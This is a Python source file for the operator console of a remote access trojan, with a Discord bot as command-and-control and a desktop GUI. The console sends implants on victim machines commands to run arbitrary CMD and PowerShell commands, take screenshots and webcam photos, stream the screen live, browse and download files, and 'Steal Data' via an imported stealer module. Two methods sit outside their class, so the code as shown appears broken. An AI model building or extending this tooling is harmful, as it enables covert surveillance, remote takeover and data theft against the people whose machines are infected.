import customtkinter as ctk
import discord
from discord.ext import commands, tasks
import threading
import asyncio
import os
from queue import Queue
from PIL import Image
import io
import requests
import stealer

# --- Configuration ---
TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470, 1385474310004670516]
LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'; STREAM_FRAME_PREFIX = 'STREAM_FRAME:'

# --- The C2 Bot that will run in the background ---
class C2Bot(commands.Bot):
    def __init__(self, command_queue: Queue, stream_queue: Queue, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.command_queue = command_queue
        self.stream_queue = stream_queue
        self.device_channels = {}
        self.selected_channel = None
        self.stream_display_message = None

    async def on_ready(self):
        print(f'[C2 BOT] Logged in as {self.user}')
        self.process_queue.start()

    async def on_message(self, message):
        # --- THIS IS THE CORRECTED LOGIC ---
        if message.author == self.user: # Check if the message is from the bot itself
            if message.content.startswith(STREAM_FRAME_PREFIX):
                # It's a stream frame message from an implant.
                url = message.content[len(STREAM_FRAME_PREFIX):]
                
                # 1. Put the URL in the queue for the UI window.
                self.stream_queue.put(url)
                
                # 2. Update the persistent display embed in Discord.
                asyncio.create_task(self.update_stream_display(url))
                
                # 3. (THE FIX) Delete the raw STREAM_FRAME message to keep the channel clean.
                try:
                    await message.delete()
                except discord.NotFound:
                    pass # Message might have been deleted already, which is fine.
            
            # Important: Stop processing any other self-messages (like command dispatches).
            return

        # If the message is not from the bot, check if it's from an authorized operator.
        if message.author.id not in AUTHORIZED_USERS: return
        
        # Process the operator's command (e.g., ?help, ?select).
        await self.process_commands(message)
        
    async def update_stream_display(self, url):
        if self.stream_display_message:
            try:
                embed = self.stream_display_message.embeds[0]
                embed.set_image(url=url)
                embed.set_field_at(0, name="Direct Frame URL", value=f"[Click Here]({url})", inline=False)
                await self.stream_display_message.edit(embed=embed)
            except (discord.NotFound, IndexError):
                self.stream_display_message = None

    @tasks.loop(seconds=0.5)
    async def process_queue(self):
        if not self.command_queue.empty():
            command_data = self.command_queue.get()
            command_type = command_data.get("type"); data = command_data.get("data")
            if command_type == "dispatch" and self.selected_channel:
                instruction = f"{INSTRUCTION_PREFIX}{data['command']} {data['args']}"
                await self.selected_channel.send(instruction)
                if data['command'] == "stop_stream" and self.stream_display_message:
                    embed = self.stream_display_message.embeds[0]
                    embed.title = "⚪ Screenshare Ended"; embed.description = "The live stream has been terminated."; embed.color = 0x95a5a6
                    await self.stream_display_message.edit(embed=embed)
                    self.stream_display_message = None
            elif command_type == "refresh_devices":
                await self.update_device_list()

    async def update_device_list(self):
        if not self.guilds: return
        guild = self.guilds[0]
        category = discord.utils.get(guild.categories, name=LIVE_SESSIONS_CATEGORY)
        self.device_channels = {ch.name: ch for ch in category.text_channels} if category else {}
        print(f"[C2 BOT] Refreshed devices: {list(self.device_channels.keys())}")

# --- Screenshare Window (Unchanged) ---
class ScreenshareWindow(ctk.CTkToplevel):
    def __init__(self, master, stream_queue, command_queue):
        super().__init__(master)
        self.title("Live Screenshare"); self.geometry("1280x720")
        self.stream_queue = stream_queue; self.command_queue = command_queue
        self.image_label = ctk.CTkLabel(self, text="Waiting for stream...", text_color="grey", font=ctk.CTkFont(size=24))
        self.image_label.pack(expand=True, fill="both")
        self.protocol("WM_DELETE_WINDOW", self.on_close)
        self.after(100, self.poll_stream_queue)
    def poll_stream_queue(self):
        if not self.stream_queue.empty():
            url = self.stream_queue.get()
            threading.Thread(target=self.fetch_and_display_image, args=(url,), daemon=True).start()
        self.after(100, self.poll_stream_queue)
    def fetch_and_display_image(self, url):
        try:
            response = requests.get(url, timeout=5); response.raise_for_status()
            img = Image.open(io.BytesIO(response.content))
            w, h = img.size; aspect_ratio = w / h; new_w, new_h = 1280, int(1280 / aspect_ratio)
            if new_h > 720: new_h, new_w = 720, int(720 * aspect_ratio)
            img = img.resize((new_w, new_h))
            ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(new_w, new_h))
            self.image_label.configure(image=ctk_img, text="")
        except Exception as e: print(f"[UI] Error fetching/displaying frame: {e}")
    def on_close(self):
        print("[UI] Closing screenshare window, sending stop command...")
        self.command_queue.put({"type": "dispatch", "data": {"command": "stop_stream", "args": ""}})
        self.destroy()

# --- Bot Thread (Unchanged) ---
class BotThread(threading.Thread):
    def __init__(self, token, command_queue, stream_queue):
        super().__init__()
        self.token = token; self.command_queue = command_queue; self.stream_queue = stream_queue
        self.loop = asyncio.new_event_loop()
        intents = discord.Intents.default(); intents.message_content = True
        self.bot = C2Bot(command_queue=self.command_queue, stream_queue=self.stream_queue, command_prefix="?", intents=intents)
    def run(self):
        asyncio.set_event_loop(self.loop)
        try: self.loop.run_until_complete(self.bot.start(self.token))
        except Exception as e: print(f"[C2 BOT] FATAL ERROR: {e}")
        finally: self.loop.close()

# --- Main GUI Application (Updated `_async_start_screenshare`) ---
class ControlCenterUI(ctk.CTk):
    def __init__(self, bot_thread: BotThread, stream_queue: Queue):
        super().__init__()
        self.bot_thread = bot_thread; self.stream_queue = stream_queue
        self.title("FOSS RAT C2 Control Center"); self.geometry("1200x700")
        self.grid_columnconfigure(0, weight=2); self.grid_columnconfigure(1, weight=5); self.grid_rowconfigure(0, weight=1)
        self.device_frame = ctk.CTkFrame(self, width=250); self.device_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.device_frame.grid_propagate(False); self.device_frame.grid_rowconfigure(2, weight=1)
        ctk.CTkLabel(self.device_frame, text="DEVICES", font=ctk.CTkFont(size=20, weight="bold")).grid(row=0, column=0, columnspan=2, padx=10, pady=10)
        ctk.CTkButton(self.device_frame, text="Refresh", command=self.refresh_device_list).grid(row=1, column=0, padx=5, pady=5)
        self.selected_device_label = ctk.CTkLabel(self.device_frame, text="Selected: None", font=ctk.CTkFont(size=14)); self.selected_device_label.grid(row=1, column=1, padx=5, pady=5)
        self.device_list_frame = ctk.CTkScrollableFrame(self.device_frame, label_text="Live Sessions"); self.device_list_frame.grid(row=2, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")
        self.command_panel = ctk.CTkFrame(self); self.command_panel.grid(row=0, column=1, padx=(0, 10), pady=10, sticky="nsew")
        self.command_panel.grid_rowconfigure(1, weight=1); self.command_panel.grid_columnconfigure(0, weight=1)
        self.log_textbox = ctk.CTkTextbox(self.command_panel, state="disabled", font=ctk.CTkFont(family="Consolas", size=14)); self.log_textbox.grid(row=1, column=0, padx=10, pady=(0,10), sticky="nsew")
        self.tab_view = ctk.CTkTabview(self.command_panel); self.tab_view.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.setup_tabs()
        self.refresh_device_list()

    def log(self, message):
        self.log_textbox.configure(state="normal"); self.log_textbox.insert("end", f"{message}\n"); self.log_textbox.configure(state="disabled"); self.log_textbox.see("end")

    def dispatch_command(self, command, args="", friendly_name=""):
        if not self.bot_thread.bot.selected_channel: self.log("[ERROR] No device selected!"); return
        self.bot_thread.command_queue.put({"type": "dispatch", "data": {"command": command, "args": args}})
        self.log(f"[DISPATCH] Sent '{friendly_name or command}' to '{self.bot_thread.bot.selected_channel.name}'")

    def select_device(self, device_name):
        self.bot_thread.bot.selected_channel = self.bot_thread.bot.device_channels.get(device_name)
        if self.bot_thread.bot.selected_channel:
            self.selected_device_label.configure(text=f"Selected: {device_name}", text_color="cyan"); self.log(f"[INFO] Selected device: {device_name}")
        else: self.log(f"[ERROR] Could not select device: {device_name}")

    def refresh_device_list(self):
        self.bot_thread.command_queue.put({"type": "refresh_devices"}); self.log("[INFO] Refreshing device list...")
        self.after(1500, self._update_device_buttons)
    
    def _update_device_buttons(self):
        for widget in self.device_list_frame.winfo_children(): widget.destroy()
        devices = self.bot_thread.bot.device_channels.keys()
        if not devices: ctk.CTkLabel(self.device_list_frame, text="No live devices found.").pack(pady=5)
        else:
            for name in sorted(devices):
                ctk.CTkButton(self.device_list_frame, text=name, command=lambda n=name: self.select_device(n)).pack(fill="x", padx=5, pady=2)
        self.log(f"[INFO] UI updated with {len(devices)} devices.")

    def start_screenshare(self):
        if not self.bot_thread.bot.selected_channel: self.log("[ERROR] No device selected!"); return
        asyncio.run_coroutine_threadsafe(self._async_start_screenshare(), self.bot_thread.loop)
        ScreenshareWindow(self, self.stream_queue, self.bot_thread.command_queue)
        
    async def _async_start_screenshare(self):
        self.dispatch_command("start_stream", friendly_name="Start Screenshare")
        channel = self.bot_thread.bot.selected_channel
        embed = discord.Embed(title="🔴 Live Screenshare", description="Stream starting...", color=discord.Color.red())
        embed.set_footer(text="This message updates with the latest frame.")
        embed.add_field(name="Direct Frame URL", value="Waiting for first frame...", inline=False)
        self.bot_thread.bot.stream_display_message = await channel.send(embed=embed)

def setup_tabs(self):
    exec_tab = self.tab_view.add("Execution")
    exec_tab.grid_columnconfigure(0, weight=1)
    cmd_entry = ctk.CTkEntry(exec_tab, placeholder_text="Enter CMD command...")
    cmd_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
    ctk.CTkButton(exec_tab, text="Run CMD", command=lambda: self.dispatch_command("runcmd", cmd_entry.get(), "Run CMD")).grid(row=0, column=1, padx=10, pady=5)
    pwsh_entry = ctk.CTkEntry(exec_tab, placeholder_text="Enter PowerShell command...")
    pwsh_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
    ctk.CTkButton(exec_tab, text="Run PowerShell", command=lambda: self.dispatch_command("runpw", pwsh_entry.get(), "Run PowerShell")).grid(row=1, column=1, padx=10, pady=5)
    system_tab = self.tab_view.add("System")
    ctk.CTkButton(system_tab, text="Take Screenshot", command=lambda: self.dispatch_command("takescreenshot", friendly_name="Take Screenshot")).pack(pady=5, padx=10, fill="x")
    ctk.CTkButton(system_tab, text="Take Webcam Picture", command=lambda: self.dispatch_command("irlpicture", friendly_name="Take Webcam Picture")).pack(pady=5, padx=10, fill="x")
    ctk.CTkButton(system_tab, text="Get System Specs", command=lambda: self.dispatch_command("systemspecs", friendly_name="Get System Specs")).pack(pady=5, padx=10, fill="x")
    ctk.CTkButton(system_tab, text="Kill Implant", command=lambda: self.dispatch_command("kill", friendly_name="Kill Implant"), fg_color="red", hover_color="darkred").pack(pady=5, padx=10, fill="x")
    interact_tab = self.tab_view.add("Interaction")
    interact_tab.grid_columnconfigure(0, weight=1)
    url_entry = ctk.CTkEntry(interact_tab, placeholder_text="https://example.com")
    url_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
    ctk.CTkButton(interact_tab, text="Open Website", command=lambda: self.dispatch_command("openwebsite", url_entry.get(), "Open Website")).grid(row=0, column=1, padx=10, pady=5)
    notif_title_entry = ctk.CTkEntry(interact_tab, placeholder_text="Notification Title")
    notif_title_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
    notif_msg_entry = ctk.CTkEntry(interact_tab, placeholder_text="Notification Message")
    notif_msg_entry.grid(row=2, column=0, padx=10, pady=5, sticky="ew")
    ctk.CTkButton(interact_tab, text="Show Notification", command=lambda: self.dispatch_command("shownotification", f'"{notif_title_entry.get()}" {notif_msg_entry.get()}', "Show Notification")).grid(row=1, rowspan=2, column=1, padx=10, pady=5, sticky="ns")
    fs_tab = self.tab_view.add("File System")
    fs_tab.grid_columnconfigure(0, weight=1)
    explore_entry = ctk.CTkEntry(fs_tab, placeholder_text="C:\\Users (or leave blank)")
    explore_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
    ctk.CTkButton(fs_tab, text="Explore Path", command=lambda: self.dispatch_command("explore", explore_entry.get(), "Explore Path")).grid(row=0, column=1, padx=10, pady=5)
    download_entry = ctk.CTkEntry(fs_tab, placeholder_text="C:\\path\\to\\file.txt on implant")
    download_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
    ctk.CTkButton(fs_tab, text="Download File", command=lambda: self.dispatch_command("download", download_entry.get(), "Download File")).grid(row=1, column=1, padx=10, pady=5)
    settings_tab = self.tab_view.add("Settings")
    self.beta_features_switch = ctk.CTkSwitch(settings_tab, text="Enable Beta Features", command=self.toggle_beta_features)
    self.beta_features_switch.pack(pady=10, padx=20, anchor="w")
    self.beta_frame = ctk.CTkFrame(settings_tab, fg_color="transparent")
    self.beta_frame.pack(fill="both", expand=True, padx=10)
    self.screenshare_button = ctk.CTkButton(self.beta_frame, text="Start Live Screenshare (Beta)", command=self.start_screenshare, fg_color="#6A5ACD", hover_color="#483D8B")
    self.steal_data_button = ctk.CTkButton(self.beta_frame, text="Steal Data (Beta)", command=lambda: self.dispatch_command("stealdata", friendly_name="Steal Data"), fg_color="red", hover_color="darkred")
    self.steal_data_button.pack(pady=5, padx=10, anchor="w")

def toggle_beta_features(self):
    if self.beta_features_switch.get() == 1:
        self.screenshare_button.pack(pady=5, padx=10, anchor="w")
        self.steal_data_button.pack(pady=5, padx=10, anchor="w")
    else:
        self.screenshare_button.pack_forget()
        self.steal_data_button.pack_forget()

if __name__ == "__main__":
    if not os.path.exists(TOKEN_PATH): print(f"FATAL: {TOKEN_PATH} not found!")
    else:
        with open(TOKEN_PATH, 'r') as f: token = f.read().strip()
        command_queue = Queue(); stream_queue = Queue()
        bot_thread = BotThread(token=token, command_queue=command_queue, stream_queue=stream_queue)
        bot_thread.daemon = True; bot_thread.start()
        app = ControlCenterUI(bot_thread=bot_thread, stream_queue=stream_queue)
        app.mainloop()